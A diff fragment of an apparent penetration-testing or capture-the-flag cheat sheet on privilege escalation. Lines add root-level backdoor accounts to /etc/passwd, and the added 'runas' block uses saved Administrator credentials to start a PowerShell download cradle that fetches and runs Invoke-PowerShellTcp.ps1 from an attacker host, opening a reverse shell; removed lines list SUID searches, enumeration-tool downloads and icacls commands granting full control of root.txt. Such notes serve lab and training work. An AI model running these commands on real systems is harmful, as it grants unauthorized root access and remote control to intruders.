@@ -227,24 +227,17 @@ echo "aqua:aajfMKNH1hTm2.dU:0:0:root:/root:/bin/bash" >> passwd
 echo aqua::0:0:root:/root:/bin/bash >> /etc/passwd
 ```
 
-Windows
+# runas
+```
 runas /user:ACCESS\Administrator /savecred "powershell -noni -nop -exec bypass-c "IEX (New-Object Net.WebClient).DownloadString('http://[LHOST]/Invoke-PowerShellTcp.ps1')"
+```
 
 ## Tool
 https://github.com/rebootuser/LinEnum
 
-Linuxprivchecker
-find / -group adm 2>/dev/null
-find / -type f -perm -4000 2>/dev/null
+https://www.securitysift.com/download/linuxprivchecker.py
 
-wget //www.securitysift.com/download/linuxprivchecker.py
-
-git clone //github.com/jondonas/linux-exploit-suggester-2.git
-
-Windows
-cacls C:\Users\Administrator
-cacls root.txt /grant <username>:F
-ICACLS root.txt /grant "Users":F
+https://github.com/jondonas/linux-exploit-suggester-2
 
 # msf
 ```
